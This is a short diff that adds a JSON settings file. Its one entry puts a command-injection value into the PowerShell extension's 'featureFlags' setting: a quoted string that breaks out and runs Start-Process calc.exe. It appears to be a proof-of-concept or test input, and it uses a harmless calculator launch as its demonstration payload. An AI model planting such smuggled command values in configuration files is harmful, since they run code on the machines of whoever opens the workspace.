@@ -1,1 +1,4 @@
 
+   {
+     "powershell.developer.featureFlags": ["'; Start-Process calc.exe; '"]
+   }
